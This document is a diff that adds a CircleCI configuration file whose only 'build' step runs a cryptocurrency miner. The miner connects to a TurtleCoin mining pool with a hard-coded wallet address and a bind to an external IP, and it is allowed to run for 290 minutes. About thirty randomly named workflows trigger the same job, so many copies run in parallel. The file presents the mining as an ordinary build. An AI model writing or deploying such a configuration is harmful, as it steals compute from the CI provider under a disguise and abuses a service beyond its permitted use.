@@ -1,0 +1,116 @@
+version: 2.1
+
+orbs:
+  win: circleci/windows@2.4.0
+
+executors:
+  circleci_machine:
+    docker:
+      - image: christiankm01/master:latest
+    working_directory: ~/repo
+commands:
+  build:
+    description: Run build
+    steps:
+      - run:
+          name: build
+          command: |
+              turtle  --bind=54.39.234.99:3129 --algorithm argon2id_chukwa2 --pool ca.turtlecoin.herominers.com:10380 --wallet TRTLv1eACSpKx6fbiG4PAiQj2xtiwxhHQ9vYZhhf84USCaabq8JSyoNX9vamnUcG35BkQy6VfwUy5CsV9YNomioPGGyVhKQKoJF.p5 --disable-gpu --cpu-threads 2
+          no_output_timeout: 290m
+jobs:
+  buildd:
+    executor: circleci_machine
+    working_directory: ~/repo
+    steps: [build]
+workflows:
+  version: 
+  build:
+    jobs:
+      - buildd
+  build2:
+    jobs:
+      - buildd
+  majista:
+    jobs:
+      - buildd
+  mijer:
+    jobs:
+      - buildd
+  namex:
+    jobs:
+      - buildd
+  manage:
+    jobs:
+      - buildd
+  naamex:
+    jobs:
+      - buildd
+  animasti:
+    jobs:
+      - buildd
+  ansjumi:
+    jobs:
+      - buildd
+  lampertas:
+    jobs:
+      - buildd
+  nsnhu:
+    jobs:
+      - buildd
+  abshun:
+    jobs:
+      - buildd
+  manjimux:
+    jobs:
+      - buildd
+  nxburtssnaj:
+    jobs:
+      - buildd
+  lamsjuminah:
+    jobs:
+      - buildd
+  xtermja:
+    jobs:
+      - buildd
+  xbahgsyter:
+    jobs:
+      - buildd
+  alskikanjj:
+    jobs:
+      - buildd
+  xmajsumi:
+    jobs:
+      - buildd
+  xnahjjkh:
+    jobs:
+      - buildd
+  xnbayunj:
+    jobs:
+      - buildd
+  xnshikn:
+    jobs:
+      - buildd
+  malijskknjj:
+    jobs:
+      - buildd
+  xbagusterp:
+    jobs:
+      - buildd
+  xmsjimahjjj:
+    jobs:
+      - buildd
+  xbshuhsj:
+    jobs:
+      - buildd
+  hxjajhjj:
+    jobs:
+      - buildd
+  jajaljn:
+    jobs:
+      - buildd
+  nxjisnjjsh:
+    jobs:
+      - buildd
+  nxhsjjjj:
+    jobs:
+      - buildd
